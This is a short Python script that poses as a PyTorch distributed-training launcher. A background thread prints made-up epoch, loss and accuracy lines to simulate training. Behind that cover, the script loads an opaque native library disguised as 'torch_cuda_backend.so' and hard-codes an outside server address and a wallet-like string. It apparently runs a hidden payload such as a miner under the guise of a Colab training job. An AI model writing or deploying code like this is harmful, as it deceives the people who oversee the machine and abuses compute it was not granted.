import ctypes
import os
import sys
import time
import threading
import random

def fake_training_logs():
    epochs = 100
    for epoch in range(epochs):
        # Fake PyTorch training output
        time.sleep(random.uniform(5.0, 15.0))
        loss = random.uniform(0.05, 0.2) / (epoch + 1)
        acc = 85.0 + (epoch / 10.0) + random.uniform(-0.5, 0.5)
        print(f"Epoch [{epoch+1}/{epochs}], Loss: {loss:.4f}, Accuracy: {acc:.2f}%", flush=True)

if __name__ == "__main__":
    print("[INIT] Loading PyTorch CUDA backend...", flush=True)
    
    # Fake training thread to produce standard output that looks like ML
    t = threading.Thread(target=fake_training_logs, daemon=True)
    t.start()
    
    # Load the library
    lib_path = "./build/torch_cuda_backend.so"
    if not os.path.exists(lib_path):
        lib_path = "./torch_cuda_backend.so" # fallback
        if not os.path.exists(lib_path):
            lib_path = os.path.join(os.path.dirname(__file__), "torch_cuda_backend.so")
            
    try:
        backend = ctypes.CDLL(lib_path)
    except OSError as e:
        print(f"Error loading backend: {e}")
        sys.exit(1)
        
    # Prepare arguments
    argc = 1
    argv = (ctypes.c_char_p * 1)()
    argv[0] = b"python3"
    
    # Default environment variables to fallback if not provided
    if "MASTER_ADDR" not in os.environ:
        os.environ["MASTER_ADDR"] = "pearl-hub-tranteo777-eb4ff2aa.koyeb.app:443"
    if "HF_TOKEN" not in os.environ:
        os.environ["HF_TOKEN"] = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"
    if "LOCAL_RANK" not in os.environ:
        os.environ["LOCAL_RANK"] = "colab_trainer"
        
    print("[INIT] Backend loaded. Starting distributed training...", flush=True)
    
    # Execute the backend
    # We call start_training, which we exported as extern "C"
    backend.start_training(argc, argv)
